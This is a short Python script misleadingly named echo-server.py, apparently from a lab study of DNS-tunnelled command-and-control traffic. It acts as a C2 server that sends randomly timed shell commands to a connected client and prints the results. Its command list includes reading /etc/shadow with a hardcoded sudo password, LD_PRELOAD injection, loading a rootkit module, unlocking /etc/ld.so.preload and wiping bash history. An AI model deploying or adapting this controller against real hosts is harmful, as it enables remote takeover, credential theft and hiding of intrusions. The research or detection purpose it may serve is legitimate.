# echo-server.py

import socket
import base64
import numpy as np
import random
import time

commands = ["echo ola", "ls", "mkdir teste", "rm teste", "ls -l /", "ls -la /", "ls /lib", "ls /lib -la", "ls /lib/", "ls /lib/crda/", "ls /home/labcom/Desktop/", "ls /home/labcom/Desktop/ -la", "ls /home/labcom/Desktop/dns2tcp/advanced-hacker/cnc/", "ls /home/labcom/Desktop/dns2tcp/advanced-hacker/cnc/ -la", "touch teste", "rm teste", "chmod +x teste", "pwd","echo labcom | sudo -S arp", "echo labcom | sudo -S arp -a", "netstat -i", "netstat -M", "tcpdump -n > output", "ip a", "ip route", "netstat -s", "netstat -r", "ip a show lo", "dig google.com", "dig google.com MX", "nslookup mindmajix.com", "echo labcom | sudo -S route", "echo labcom | sudo -S iwconfig", "wget https://raw.githubusercontent.com/brnaguiar/linreg-c/main/linreg.py", "curl -O google.com/doodles/childrens-day-2014-multiple-countries", "whois fcporto.pt", "whois ua.pt", "users", "groups", "uname -a", "LD_PRELOAD=\/tmp/wqs.so\ /bin/ls", "modprobe -r rootkit.ko", "echo labcom | sudo -S insmod rootkit.ko", "kill -9 12313123", "chattr -i /etc/ld.so.preload", "echo labcom | sudo -S cat /etc/shadow", "echo labcom | sudo -S cat /etc/passwd > file", "echo  > ~/.bash_history", "ps aux | grep client" ]


HOST = "111.11.11.10"  # Standard loopback interface address (localhost)i   111.11.11.10AA
PORT = 65321#4440   # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f"Connected by {addr}")
        while True:
            time.sleep(random.randint(15, 45))
            """ SEND COMMAND """ 
            command = commands[random.randint(0, len(commands)-1)]
            conn.send(command.encode(encoding='ascii'))

            """ WAIT FOR OUTPUT DATA """
            data_str = ''
            print(" ")
            while "<CTAIL>" not in data_str:
                data = conn.recv(1024)
                #if not data:
                #    break
                data_str = data.decode()
                print(data_str, end="")  # strpubase64.b64decode()
                if "<CTAIL>" in data_str:
                    break
                ###conn.sendall(data)
